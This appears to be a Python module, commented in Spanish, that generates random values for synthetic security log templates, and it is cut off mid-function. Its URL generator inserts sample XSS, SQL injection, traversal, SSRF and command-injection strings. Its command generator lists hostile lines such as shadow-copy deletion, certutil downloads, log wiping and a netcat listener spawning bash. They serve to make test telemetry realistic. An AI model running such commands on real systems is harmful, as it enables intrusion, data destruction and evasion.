# data_generators.py

"""
Módulo para generar datos aleatorios utilizados en las plantillas de log.
"""

import random
import datetime
import uuid
import ipaddress
import string
import os
from datetime import datetime, timedelta

# --- Funciones auxiliares (random_ip, random_port, etc.) ---
# --- (Todas las funciones existentes desde random_ip hasta random_placeholder se mantienen aquí sin cambios) ---
# --- (Omitidas por brevedad en esta respuesta, pero están presentes en el código final) ---

def random_ip(type='any'):
    """Genera una dirección IP. Reemplaza y mejora la función random_ip original.
    :param type: 'any' (default), 'internal' (RFC1918), 'external' (pública).
    """
    if type == 'internal':
        prefix = random.choice(['192.168', '10', '172'])
        if prefix == '10':
            return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        elif prefix == '172':
            return f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        else:
            return f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"
    elif type == 'external':
        while True:
            ip_str = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            try:
                ip_obj = ipaddress.ip_address(ip_str)
                if not (ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local or ip_obj.is_multicast or ip_str.startswith('0.') or ip_str.startswith('169.254.')):
                    return ip_str
            except ValueError:
                continue
    else:  # 'any' - Comportamiento más cercano al original posible
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def random_port(type='ephemeral'):
    """Genera un puerto. Reemplaza y mejora la función random_port original.
    :param type: 'ephemeral' (default, >1024), 'well-known' (<1024), 'any'.
    """
    if type == 'well-known':
        # Lista ampliada de puertos comunes relevantes para seguridad
        return random.choice([21, 22, 23, 25, 53, 69, 80, 88, 110, 111, 119, 123, 135, 137, 138, 139, 143, 161, 162, 389, 443, 445, 514, 636, 993, 995, 1433, 1434, 1521, 3306, 3389, 5900, 5985, 5986])
    elif type == 'any':
        return random.randint(1, 65535)
    else: # 'ephemeral' - Rango IANA recomendado
        # return random.randint(1025, 65535) # Esto podría ser demasiado amplio
        return random.randint(49152, 65535) # Rango IANA recomendado para efímeros

def random_src_port():
    return random_port()  # Reutilizar la función `random_port`

def random_user():
    return random.choice([
        'admin', 'user', 'guest', 'root', 'sysadmin', 'john.doe'
        'jane.smith', 'alice.jones', 'bob.brown', 'charlie.white',
        'dave.black', 'eve.green', 'frank.red', 'grace.blue', 'hank.yellow',
        'irene.purple', 'jack.orange', 'karen.pink', 'larry.cyan',
        'mike.brown', 'nina.teal', 'olivia.gold', 'paul.silver', 'quinn.platinum',
        'rachel.bronze', 'sam.copper', 'tina.brass', 'ursula.tin',
        'victor.lead', 'wendy.zinc', 'xander.metal', 'yara.steel', 'zane.iron'
    ])

def random_service():
    return random.choice([
        'HTTP', 'HTTPS', 'SSH', 'DNS', 'ICMP', 'FTP', 'SMTP', 'POP3', 'IMAP',
        'Telnet', 'RDP', 'SNMP', 'LDAP', 'MySQL', 'PostgreSQL', 'Redis',
        'MongoDB', 'Memcached', 'NTP', 'DHCP', 'TFTP', 'SIP', 'RTSP', 'RTP',
        'SIP', 'SMB', 'NetBIOS', 'NFS', 'iSCSI', 'CIFS', 'AFP', 'Rsync',
        'SFTP', 'FTPS', 'HTTPS', 'WebDAV', 'SOAP', 'REST', 'GraphQL',
        'MQTT', 'AMQP', 'XMPP', 'Jabber', 'IRC', 'Bittorrent', 'Usenet',
        'WebSocket', 'HTTP/2', 'QUIC', 'SCTP', 'DCCP', 'UDP', 'TCP',
        'ICMPv6', 'GRE', 'IPSec', 'L2TP', 'PPTP', 'SSTP', 'OpenVPN',
        'WireGuard', 'IKEv2', 'IPSec NAT-T', 'SSL VPN', 'SSH Tunneling',
        'HTTP Tunneling', 'DNS Tunneling', 'ICMP Tunneling', 'UDP Tunneling',
        'TCP Tunneling', 'SCTP Tunneling', 'DCCP Tunneling', 'GRE Tunneling',
        'L2TP Tunneling', 'PPTP Tunneling', 'SSTP Tunneling', 'OpenVPN Tunneling',
        'WireGuard Tunneling', 'IKEv2 Tunneling', 'IPSec NAT-T Tunneling',
        'SSL VPN Tunneling', 'SSH Tunneling', 'HTTP Tunneling', 'DNS Tunneling'
    ])

def random_service_name():
    return random.choice(['nginx', 'apache2', 'mysql', 'postgresql', 'redis', 'mongodb', 'ssh', 'ftp', 'httpd'])

def random_event():
    return random.choice(['reboot', 'config-change', 'interface-down', 'session-timeout'])

def random_process():
    return random.choice([
        'cmd.exe', 'powershell.exe', 'notepad.exe', 'svchost.exe',
        'explorer.exe', 'java.exe', 'python.exe',
        'bash', 'sh', 'zsh', 'python3', 'perl', 'ruby',
        'java', 'node', 'npm', 'git', 'docker', 'nginx', 'apache2',
        'mysql', 'postgresql', 'redis-server', 'mongod', 'memcached',
        'ssh', 'sshd', 'vsftpd', 'proftpd', 'httpd', 'vsftpd',
        'sendmail', 'postfix', 'exim', 'dovecot', 'bind', 'named',
        'iptables', 'firewalld', 'ufw', 'fail2ban', 'auditd',
        'syslogd', 'rsyslogd', 'cron', 'atd', 'systemd', 'upstart',
        'init', 'launchd', 'supervisord', 'runit', 's6', 'monit',
        'supervisord', 'runit', 's6', 'monit', 'god', 'daemontools'
    ])

def random_file_name():
    """Genera un nombre de archivo genérico con más variedad. Reemplaza random_file_name."""
    name = random.choice(['config', 'setup', 'install', 'payload', 'document', 'report', 'data', 'backup', 'script', 'update', 'invoice', 'secret', 'key', 'loader', 'kernel', 'image', 'module', 'library', 'temp', 'output', 'debug', 'user_list', 'cred', 'token', 'cert'])
    ext = random.choice(['.exe', '.dll', '.sys', '.ps1', '.sh', '.vbs', '.js', '.php', '.asp', '.aspx', '.jar', '.py', '.pl', '.bat', '.cmd', '.scr', '.pdf', '.docx', '.xlsx', '.zip', '.rar', '.img', '.iso', '.dat', '.ini', '.conf', '.cfg', '.bak', '.tmp', '.log', '.txt', '.pem', '.crt', '.key', '.msi', '.msp', '.cab', '.so', '.dylib', '.xml', '.json', '.sql', '.csv', '.db'])
    prefix = random.choice(['', 'tmp_', 'bkp_', 'new_', 'old_', f'{random.randint(100,999)}_', 'mal_', 'test_'])
    suffix = random.choice(['', str(random.randint(1, 50)), uuid.uuid4().hex[:6]])
    return f"{prefix}{name}{suffix}{ext}"

def random_registry_path(hive=None):
    """Genera una ruta de registro de Windows plausible."""
    if hive is None:
        hive = random.choice(['HKLM', 'HKCU', 'HKCR', 'HKU'])

    base = random.choice([
        'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
        'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
        'SYSTEM\\CurrentControlSet\\Services\\{svc}',
        'SOFTWARE\\Policies\\Microsoft\\Windows Defender',
        'SOFTWARE\\Policies\\Microsoft\\Windows\\System',
        'SYSTEM\\CurrentControlSet\\Control\\Lsa',
        'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
        'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{exe}',
        'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders',
        'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings',
        'Software\\Classes\\{clsid}'
    ]).format(svc=random.choice(['Tcpip', 'Dnscache', 'WinDefend', 'BITS', 'Spooler', 'SamSs']),
            exe=random.choice(['explorer.exe', 'svchost.exe', 'taskmgr.exe', 'cmd.exe', 'sethc.exe']),
            clsid=str(uuid.uuid4()))

    for _ in range(random.randint(0, 3)):
        base += '\\' + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(4, 10)))

    return f"{hive}\\{base}"

def random_placeholder(prefix="Placeholder"):
    """Generador genérico para placeholders no cubiertos anteriormente."""
    return f"{prefix}_{''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))}"

def random_policy_name_generic():
    """Genera un nombre de política genérico."""
    prefix = random.choice(['Block-', 'Allow-', 'Monitor-', 'Default-', 'Geo-', 'IPS-', 'Web-', 'App-', 'Auth-', 'DLP-'])
    subject = random.choice(['Malware', 'Phishing', 'C2', 'Internal', 'External', 'Traffic', 'RDP', 'SMB', 'Sensitive', 'AdminAccess', 'Downloads', 'USB'])
    suffix = random.choice(['Policy', 'Rule', 'Set', '-Strict', '-Warn', ''])
    return f"{prefix}{subject}{suffix}"

def random_domain():
    return random.choice(['example.com', 'malicious.net', 'phishing.org'])

def random_url(with_params=True, add_attacks=True):
    """Genera una URL plausible con más opciones y ataques simulados. Reemplaza random_url."""
    proto = random.choice(['http', 'https'])
    domain = random_domain()
    path_segments = []
    for _ in range(random.randint(0, 4)):
        seg = ''.join(random.choice(string.ascii_lowercase + string.digits + '-') for _ in range(random.randint(3, 10)))
        path_segments.append(seg)
    path = '/' + '/'.join(path_segments)

    if path != '/' and random.random() > 0.3:
        path += random.choice(['.php', '.asp', '.aspx', '.html', '.htm', '.jsp', '.do', '.action', '', '/'])
    elif path == '/':
        path = '/'
    else:
        path += '/'

    query = ''
    if with_params and random.random() > 0.4:
        num_params = random.randint(1, 5)
        params = []
        for i in range(num_params):
            p_name = random.choice(['id', 'user', 'query', 'search', 'file', 'path', 'url', 'redirect', 'token', 'session', f'param{i}', 'name', 'value'])
            p_val = ''.join(random.choice(string.ascii_lowercase + string.digits + '_-') for _ in range(random.randint(5, 25)))
            if add_attacks:
                attack_roll = random.random()
                if attack_roll < 0.05: p_val = "<script>alert(String.fromCharCode(88,83,83))</script>" # XSS
                elif attack_roll < 0.10: p_val = "' UNION SELECT @@version -- " # SQLi
                elif attack_roll < 0.15: p_val = "..%2F..%2F..%2Fwindows\\win.ini" # Traversal (Encoded)
                elif attack_roll < 0.20: p_val = "file:///etc/passwd" # LFI
                elif attack_roll < 0.25: p_val = "http://127.0.0.1:8080/internal-api" # SSRF
                elif attack_roll < 0.30: p_val = "data:text/html;base64,{encoded_payload}".format(encoded_payload=uuid.uuid4().hex[:20]) # Data URI
                elif attack_roll < 0.35: p_val = "; ls -al /;" # Command Injection
                elif attack_roll < 0.40: p_val = f"{{{{7*7}}}}" # SSTI pattern
            params.append(f"{p_name}={p_val}")
        query = '?' + '&'.join(params)
    return f"{proto}://{domain}{path}{query}"

def random_file_path(os_type=None):
    """Genera una ruta de archivo plausible con más variedad. Reemplaza random_file_path.
    :param os_type: 'windows', 'linux', None (aleatorio).
    """
    if os_type is None:
        os_type = random.choice(['windows', 'linux'])

    user = random.choice(['administrator', 'admin', 'root', 'system', 'network service', 'localservice', 'jdoe', 'asmith', 'testuser', 'service_acc', random_user()]) # Incluye tu función original
    filename = random_file_name() # Llama a la función mejorada

    if os_type == 'windows':
        base = random.choice([
            f'C:\\Windows\\System32\\', f'C:\\Windows\\SysWOW64\\', f'C:\\Windows\\Temp\\',
            f'C:\\Program Files\\{random.choice(["Common Files", "VendorApp", "Utilities"])}\\',
            f'C:\\Program Files (x86)\\{random.choice(["Tool", "OldApp", "Support"])}\\',
            f'C:\\Users\\{user}\\AppData\\Local\\Temp\\', f'C:\\Users\\{user}\\Downloads\\',
            f'C:\\Users\\{user}\\Documents\\',
            f'C:\\Users\\{user}\\AppData\\Roaming\\{random.choice(["Microsoft", "Mozilla", "SomeApp"])}\\',
            f'D:\\Shares\\Public\\',
            f'\\\\{random.choice(["FILESRV", "DC01", "APP03"])}\\Shares\\{random.choice(["Data", "Profiles", "Software"])}\\'
        ])
        if random.random() < 0.3:
            subdirs = '\\'.join(''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(4, 8))) for _ in range(random.randint(1, 2)))
            base = base.rstrip('\\') + '\\' + subdirs + '\\'
        return base + filename
    else: # linux/macos
        base = random.choice([
            '/tmp/', '/var/log/', '/var/tmp/', '/etc/', '/etc/init.d/', f'/home/{user}/',
            f'/home/{user}/.ssh/', f'/home/{user}/.config/',
            f'/Users/{user}/Library/Application Support/', f'/Users/{user}/Downloads/',
            '/usr/local/bin/', '/usr/local/sbin/', '/usr/bin/', '/usr/sbin/',
            '/opt/{appname}/bin/'.format(appname=random.choice(['splunk', 'nginx', 'customapp'])),
            '/root/', '/mnt/{mountname}/'.format(mountname=random.choice(['data', 'nfs', 'backup']))
        ])
        if random.random() < 0.3:
            subdirs = '/'.join(''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(4, 8))) for _ in range(random.randint(1, 2)))
            base = base.rstrip('/') + '/' + subdirs + '/'
        return base + filename

def random_command():
    """Genera una línea de comando (puede ser maliciosa) con más variedad. Reemplaza random_command."""
    commands = [
        "powershell.exe -nop -w hidden -enc {encoded_ps}",
        "cmd.exe /c \"net user {user} /active:no\"",
        "wmic process call create \"rundll32.exe {dll_path},Entry\"",
        "reg.exe add \"{reg_path}\" /v {value_name} /t REG_SZ /d \"{value_data}\" /f",
        "schtasks.exe /create /tn \"{task_name}\" /tr \"{command}\" /sc ONCE /st {time} /F",
        "vssadmin.exe delete shadows /all /quiet",
        "bitsadmin.exe /transfer {job_name} /download /priority FOREGROUND {url} \"{local_path}\"",
        "certutil.exe -urlcache -split -f {url} {local_path}",
        "netsh.exe advfirewall firewall set rule name=\"{rule_name}\" new enable=no",
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert('run');",
        "mshta.exe vbscript:Close(Execute(\"{vbs_code}\"))",
        "bash -c 'echo \"{data}\" | base64 --decode | bash -i'",
        "curl -k -o /tmp/{filename} {url}", # Added -k for insecure
        "wget --no-check-certificate -q -O /dev/null {url}", # Added --no-check-certificate
        "rm -rf /var/log/* ; history -c", # Added history clear
        "chmod 777 /tmp/{script}", # Changed permissions
        "nmap -sV -A -T4 {target_ip}", # Added -A and -T4
        "nc -nvlp {port} -e /bin/bash", # Added -nv
        "ping -c 50 -s 1400 {target_ip}" # Changed ping parameters
    ]
    chosen_command = random.choice(commands)
    # Rellena placeholders dentro de la plantilla elegida
    try:
        return chosen_command.format(
            encoded_ps=uuid.uuid4().hex, # Simplificación
            user=random_user(),
            dll_path=random_file_path(os_type='windows'), # Corregido os -> os_type
            reg_path=random_registry_path(), # Usa la nueva función
            value_name=random_placeholder("RegValue"),
            value_data=uuid.uuid4().hex,
            task_name=random_placeholder("TaskName"),
            command=f"c:\\windows\\temp\\{random_file_name()}",
            time=datetime.now().strftime('%H:%M'),
            job_name=random_placeholder("BITSJob"),
            url=random_url(with_params=False, add_attacks=False),
            local_path=random_file_path(),
            rule_name=random_policy_name_generic(), # Usa la nueva función
            vbs_code="CreateObject(\\\"WScript.Shell\\\").Run(\\\"calc.exe\\\")", # Escaped quotes
            data=uuid.uuid4().hex,
            filename=random_file_name(),
            script=random_file_name(),
            target_ip=random_ip(type='external'), # Usa la función mejorada
            port=random_port(type='ephemeral') # Usa la función mejorada
        )
    except KeyError as e:
        # Si falta un placeholder específico en esta llamada .format, devuelve un comando simple
        print(f"\nWarning: Placeholder {e} missing for command template. Returning simple command.")
        return random.choice(["whoami", "ipconfig /all", "ls -la", "ps aux"])


def random_setting():
    return random.choice(['ssh-port', 'hostname', 'timezone',])

def random_value():
    return random.choice(['22', 'server1', 'UTC', 'PDT', 'EST'])

def random_load():
    return round(random.uniform(0.1, 5.0), 2)

def random_object_name():
    return random.choice(['Object1', 'Object2', 'Object3',])

def random_rule_name():
    return random.choice(['Rule1', 'Rule2', 'Rule3',])

def random_file_hash():
    # Prefiere usar las funciones específicas md5, sha1, sha256
    return random.choice([random_md5(), random_sha1(), random_sha256()])

def random_threat_name():
     # Prefiere usar la función más detallada random_threat_name_generic()
    return random_threat_name_generic()

def random_category():
    return random.choice(['Malware', 'Phishing', 'Spam', 'Social Engineering', 'C&C', 'Scanning', 'Policy Violation', 'Web Ads/Analytics', 'Business Systems', 'Streaming Media', 'Adult/Mature Content']) # Ampliado

def random_mapping_name():
    return random.choice(['Mapping1', 'Mapping2', 'Mapping3'])

def random_device():
    return random.choice([
        '/dev/sda1',
        '/dev/sdb1',
        '/dev/nvme0n1',
        '/dev/vda1', # Added virtual disk
        '/dev/hda1', # Older IDE
        '/dev/sr0',
        '/dev/loop0',
        '/dev/mapper/vg0-lv_root' # LVM
    ])

def random_mount_point():
    return random.choice(['/mnt/data', '/mnt/backup', '/mnt/external', '/media/usb0', '/srv/nfs/share', '/'])

def random_filesystem():
    return random.choice(['ext4', 'ntfs', 'xfs', 'btrfs', 'vfat', 'apfs', 'zfs', 'cifs', 'nfs']) # Ampliado

def random_free_space():
    return random.randint(100, 100000)  # Espacio libre en MB (rango ampliado)

def random_cpu_usage():
    return round(random.uniform(0.1, 100.0), 1) # Porcentaje de uso de CPU con decimal

def random_memory_usage():
    return round(random.uniform(5.0, 95.0), 1) # Porcentaje de uso de memoria con decimal

def random_timezone():
    # Lista más extensa de zonas horarias comunes
    return random.choice(['UTC', 'GMT', 'US/Pacific', 'US/Mountain', 'US/Central', 'US/Eastern', 'Europe/London', 'Europe/Berlin', 'Europe/Moscow', 'Asia/Tokyo', 'Asia/Shanghai', 'Asia/Kolkata', 'Australia/Sydney', 'America/Sao_Paulo', 'Africa/Johannesburg'])

def random_update():
    return random.choice([
        'Security Patch KB5012345',
        'Kernel Update 5.15.30-generic',
        'App Update v3.4.1-stable',
        'Library openssl-1.1.1n update',
        'Firmware Update v1.0.8-build2',
        'NVIDIA Driver Update 510.47.03',
        'Windows Feature Update 22H2',
        'Definition Update 1.363.15.0'
    ])

def random_details():
    # Más detalles específicos de seguridad
    return random.choice([
        'Sensitive data accessed via SQLi vector',
        'Unauthorized file transfer to external IP',
        'Data exfiltration attempt via DNS tunneling detected',
        'Malicious script execution blocked by EDR',
        'Unauthorized access to database `prod_customers`',
        'Suspicious network activity: C2 beaconing to known bad domain',
        'Unauthorized software installation: AnyDesk.exe detected',
        'Data integrity violation: Critical system file modified',
        'Unauthorized access to cloud storage bucket `company-secrets`',
        'Malicious email attachment `invoice.zip` containing agent.exe opened',
        'Privilege escalation attempt via Juicy Potato detected',
        'Lateral movement attempt using stolen Kerberos ticket',
        'Password spraying attack detected from multiple IPs',
        'Ransomware activity pattern detected on filesystem',
        'Potential Log4Shell exploitation attempt blocked'
    ])

def random_dir_path():
    # Usa random_file_path y quita el nombre del archivo
    full_path = random_file_path()
    return os.path.dirname(full_path)

def random_script_path():
     # Usa random_file_path asegurando extensión de script
    path_base = random_file_path()
    ext = random.choice(['.sh', '.py', '.ps1', '.bat', '.vbs', '.js'])
    return os.path.splitext(path_base)[0] + ext

def random_tool_name():
    # Lista ampliada de herramientas comunes (seguridad y admin)
    return random.choice([
        'nmap', 'metasploit', 'hydra', 'sqlmap', 'aircrack-ng',
        'wireshark', 'tcpdump', 'burpsuite', 'john', 'hashcat',
        'masscan', 'nikto', 'gobuster', 'dirb', 'ffuf',
        'powersploit', 'bloodhound', 'mimikatz', 'responder',
        'cobaltstrike', 'empire', 'putty', 'winscp', 'netcat', 'socat',
        'sysinternals', 'pslist', 'psloggedon', 'autoruns', 'procdump',
        'kubectl', 'docker', 'terraform', 'ansible', 'chef', 'puppet'
    ])

def random_job_name():
    return random.choice([
        'backup_job_daily', 'cleanup_tmp_hourly', 'sync_ad_users', 'monitor_disk_space', 'update_vulnerabilities_db', 'RotateLogs', 'SystemCleanup', 'SecurityScanNightly'
    ])

def random_feature():
    # Lista ampliada de características de seguridad/UTM
    return random.choice([
        'Antivirus', 'Firewall', 'VPN', 'IPS', 'URL Filtering',
        'Application Control', 'Threat Prevention', 'Data Loss Prevention',
        'Web Filtering', 'Email Security', 'Sandboxing', 'Anti-Spam',
        'Anti-Bot', 'CASB', 'ZTNA', 'Endpoint Detection & Response (EDR)',
        'SSL Inspection', 'Content Filtering', 'Bandwidth Management', 'GeoIP Blocking'
    ])

def random_interface():
    # Nombres de interfaz más variados (físicas, virtuales, lógicas)
    return random.choice(['eth0', 'wlan0', 'lo', 'eth1', 'ppp0', 'enp3s0', 'ens192', 'bond0', 'br0', 'vlan10', 'tun0', 'docker0', 'eno1', 'em1', 'GigabitEthernet0/1', 'TenGigabitEthernet1/0/1', 'Port-channel1', 'Loopback0', 'mgmt0'])

def random_dns_servers():
    # Combinaciones de servidores DNS comunes (internos y públicos)
    return random.choice([
        '8.8.8.8, 8.8.4.4', '1.1.1.1, 1.0.0.1', '9.9.9.9, 149.112.112.112', '208.67.222.222, 208.67.220.220',
        '192.168.1.1', '10.0.0.1', '172.16.0.1', '192.168.1.254, 192.168.1.1'
    ])

def random_gateway():
    # Gateways comunes en diferentes rangos privados
    return random.choice([
        '192.168.1.1', '10.0.0.1', '172.16.0.1', '192.168.0.1', '192.168.1.254', '10.1.1.1', '172.31.255.254'
    ])

def random_ip_address():
    return random_ip()  # Reutilizar la función random_ip()

def random_start_type():
    # Tipos de inicio de servicio (Windows y systemd)
    return random.choice(['Automatic', 'Manual', 'Disabled', 'Automatic (Delayed Start)', 'enabled', 'disabled', 'static', 'masked'])

def random_state():
    # Estados más variados (servicios, interfaces, procesos)
    return random.choice(['Running', 'Stopped', 'Paused', 'Starting', 'Stopping', 'Restarting', 'Reloading', 'Active', 'Inactive', 'Failed', 'Up', 'Down', 'Admin Down', 'Testing', 'Dormant']) # Merged choices

def random_version():
    # Formatos de versión más variados
    return random.choice([
        f'{random.randint(1,15)}.{random.randint(0,20)}.{random.randint(0,50)}',
        f'v{random.randint(0,5)}.{random.randint(1,9)}-beta{random.randint(1,3)}',
        f'{random.randint(2020, 2025)}{random.randint(1,12):02d}{random.randint(1,28):02d}',
        uuid.uuid4().hex[:8] # Build hash
        ])

def random_file_type():
    # Tipos de archivo más extensos, incluyendo scripts, binarios, documentos
    return random.choice(['exe', 'dll', 'sys', 'ps1', 'sh', 'py', 'bat', 'vbs', 'js', 'jar', 'elf', 'macho', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'pdf', 'zip', 'rar', '7z', 'tar.gz', 'iso', 'img', 'jpg', 'png', 'gif', 'mp4', 'avi', 'mp3', 'wav', 'txt', 'csv', 'json', 'xml', 'yaml', 'log', 'pem', 'crt', 'key', 'dat', 'db', 'sql'])

def random_verdict():
    # Veredictos de seguridad más específicos
    return random.choice(['Malicious', 'Benign', 'Suspicious', 'Unknown', 'Clean', 'Potentially Unwanted Program (PUP)', 'Adware', 'Hacktool', 'Confirmed Phish', 'Spam', 'Bulk Mail', 'Policy Violation', 'Safe'])

def random_admin():
    # Nombres de usuario administrador más variados
    return random.choice(['admin', 'root', 'superuser', 'sysadmin', 'administrator', 'localadmin', 'domainadmin', 'netadmin', 'dbadmin'])

def random_group():
    # Grupos comunes en Windows (AD) y Linux
    return random.choice(['Administrators', 'Users', 'Guests', 'Power Users', 'Remote Desktop Users', 'Domain Admins', 'Enterprise Admins', 'Schema Admins', 'Backup Operators', 'Server Operators', 'Account Operators', 'Print Operators', 'root', 'wheel', 'sudo', 'adm', 'docker', 'sys', 'bin', 'daemon'])

def random_acl():
    # Nombres de ACL más descriptivos
    return random.choice(['Allow_Internal_Web', 'Deny_External_RDP', 'Permit_Guest_WiFi_Internet', 'Block_Tor_ExitNodes', 'Monitor_Admin_Logins', 'Default_Deny', 'Explicit_Allow_AppServer', 'Implicit_Deny']) # Merged choices

def random_protocol():
    # Protocolos de red/aplicación más comunes
    return random.choice(['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'FTP', 'SSH', 'Telnet', 'DNS', 'SMTP', 'POP3', 'IMAP', 'LDAP', 'RDP', 'SMB', 'NFS', 'SNMP', 'Syslog', 'NTP', 'DHCP', 'BGP', 'OSPF', 'EIGRP', 'GRE', 'IPSEC', 'SSL', 'TLS', 'Kerberos'])

def random_type():
    # Renombrar a random_generic_type_code para evitar colisiones
    return random.randint(0, 255)

def random_code():
    # Renombrar a random_generic_status_code para evitar colisiones
    return random.randint(0, 255)

def random_dst_ip():
    return random_ip()  # Reutilizar la función random_ip()

def random_sigid():
     # Usar la función más específica random_signature_id()
    return random_signature_id()

def random_trap():
    # OIDs de traps SNMP comunes (simplificados)
    return random.choice(['LinkDown', 'LinkUp', 'AuthenticationFailure', 'ColdStart', 'WarmStart', 'egpNeighborLoss', 'HighCPU', 'LowMemory', 'FanFailure', 'PowerSupplyFailure'])

def random_status():
    # Estados HTTP más comunes
    return random.choice(['200 OK', '404 Not Found', '500 Internal Server Error', '403 Forbidden', '301 Moved Permanently', '302 Found', '401 Unauthorized', '400 Bad Request', '503 Service Unavailable', '201 Created', '204 No Content'])

def random_filename(): # Already defined above as random_file_name
    return random_file_name()

def random_disk():
    # Nombres de disco más variados
    return random.choice(['/dev/sda', '/dev/sdb', '/dev/nvme0n1', '/dev/vda', 'C:', 'D:', 'PhysicalDrive0', 'HarddiskVolume1'])

def random_share_name():
    # Nombres de compartidos SMB/NFS
    return random.choice(['Public', 'SharedDocs', 'Backup', 'Media', 'Projects', 'UserData', 'Profiles', 'Software', 'ScanDeposit', 'IPC$', 'ADMIN$'])

def random_dst_port():
    return random_port()  # Reutilizar la función `random_port`

def random_package_name():
    # Nombres de paquetes comunes (Linux/Python/Node)
    return random.choice(['nginx', 'apache2', 'mysql-server', 'postgresql', 'redis-server', 'mongodb-org', 'openssh-server', 'vsftpd', 'httpd', 'docker-ce', 'kubelet', 'python3-pip', 'requests', 'numpy', 'pandas', 'express', 'react', 'lodash', 'coreutils', 'glibc', 'systemd'])

def random_temp():
    # Temperaturas más realistas (CPU/Chasis) en °C
    return round(random.uniform(25.0, 95.0), 1)

def random_devname():
    # Nombres de dispositivo más genéricos (hostname o ID)
    return random.choice(['FGT-VM01', 'PA-VM-FW2', 'ASA5516-X', 'SRX340', 'MX104', 'SW-CORE-1', 'DC01-SRV', 'WEBAPP03', uuid.uuid4().hex[:12]])

def random_logid():
    # IDs de log más genéricos (numéricos largos)
    return ''.join(random.choice(string.digits) for _ in range(10))

def random_severity(levels=None):
    """Genera un nivel de severidad común (permite especificar niveles). Reemplaza random_severity."""
    # Incluir niveles numéricos Syslog y otros formatos
    default_levels = [
        'Low', 'Medium', 'High', 'Critical',                                     # Descriptivos
        'Informational', 'Notice', 'Warning', 'Error', 'Critical', 'Alert', 'Emergency', # Syslog (RFC5424 names)
        'INFO', 'WARN', 'ERROR', 'FATAL', 'DEBUG',                              # Log4j style
        '0', '1', '2', '3', '4', '5', '6', '7',                                 # Syslog (RFC5424 numbers)
        'low', 'medium', 'high', 'critical', 'info'                             # Lowercase variants
        ]
    chosen_levels = levels if levels is not None else default_levels
    return random.choice(chosen_levels)

def random_iface():
     # Reutilizar random_interface
    return random_interface()

def random_session():
    # IDs de sesión más largos
    return random.randint(100000, 99999999)

def random_rule():
     # Reutilizar random_rule_name o random_policy_name_generic
    return random.choice([random_rule_name(), random_policy_name_generic()])

def random_object():
    # Reutilizar random_object_name
    return random_object_name()

def random_tunnel():
    # Nombres de túnel VPN más descriptivos
    return random.choice(['VPN_to_Azure', 'Site2Site_OfficeB', 'RemoteAccess_Users', 'IPSec_Tunnel_1', 'SSLVPN_Sales', 'GRE_Tunnel_MPLS'])

def random_used():
    return random.randint(1, 100)  # Porcentaje de memoria/recurso usado

def random_hostname():
    # Hostnames más variados (servidores, clientes, dispositivos de red)
    domain = random.choice(['', '.corp.local', '.example.com', '.internal', '.ad.company.net'])
    name = random.choice(['router1', 'switch1', 'firewall1', 'core1', 'edge1', 'server01', 'db02', 'webfe03', 'clientpc101', 'laptop-jdoe', 'dc01', 'appvm5', 'k8s-node-3'])
    return f"{name}{domain}"

def random_vty():
    # Líneas VTY comunes en Cisco
    return random.randint(0, 15)

def random_packet_count():
    return random.randint(1, 100000) # Rango ampliado

def random_sig_id():
     # Usar la función más específica random_signature_id()
    return random_signature_id()

def random_subsig_id():
    return random.randint(0, 10) # Sub-IDs comunes

def random_description():
    # Descripciones más variadas (eventos, alertas, configuraciones)
    return random.choice([
        'Malware C&C traffic detected', 'Suspicious login attempt from new geolocation', 'Unauthorized access blocked by policy',
        'Configuration change applied by user {admin}', 'Interface {interface} changed state to {state}', 'High CPU utilization detected',
        'User {user} authenticated successfully', 'VPN tunnel {tunnel} established', 'System reboot initiated', 'Security policy "{policy}" updated'
        ]).format(admin=random_admin(), interface=random_interface(), state=random_state(), user=random_user(), policy=random_policy_name_generic(), tunnel=random_tunnel())

def random_tcp_flags():
    # Combinaciones comunes de flags TCP
    flags = {'S': 'SYN', 'A': 'ACK', 'F': 'FIN', 'R': 'RST', 'P': 'PSH', 'U': 'URG'}
    # Elige 1 o 2 flags comunes (SYN, SYN/ACK, ACK, FIN/ACK, RST)
    roll = random.random()
    if roll < 0.3: return flags['S']                     # SYN
    elif roll < 0.6: return f"{flags['S']},{flags['A']}" # SYN/ACK
    elif roll < 0.8: return flags['A']                     # ACK
    elif roll < 0.9: return f"{flags['F']},{flags['A']}" # FIN/ACK
    else: return flags['R']                                # RST

def random_access_group():
    # Nombres de access-group de Cisco
    return random.choice(['inside_access_in', 'outside_access_in', 'dmz_access_out', 'VPN_Filter', 'Management_ACL'])

def random_drop_rate():
    return random.randint(1, 1000) # Paquetes por segundo

def random_burst_rate():
    return random.randint(1000, 5000) # Bytes

def random_max_burst_rate():
    return random.randint(5000, 20000) # Bytes

def random_avg_rate():
     return random.randint(1, 500) # Paquetes por segundo

def random_max_avg_rate():
    return random.randint(500, 2000) # Paquetes por segundo

def random_total_count():
    return random.randint(1000, 1000000) # Contador total

def random_icmp_type():
    # Tipos ICMP comunes
    return random.choice([0, 3, 8, 11, 4, 5, 13, 14]) # Echo Reply, Dest Unreachable, Echo Request, Time Exceeded, Source Quench, Redirect, Timestamp Req, Timestamp Reply

def random_icmp_code():
    # Códigos ICMP comunes (dependientes del tipo, pero aquí genérico)
    return random.randint(0, 15)

def random_fragment_count():
    return random.randint(1, 100)

def random_fragment_id():
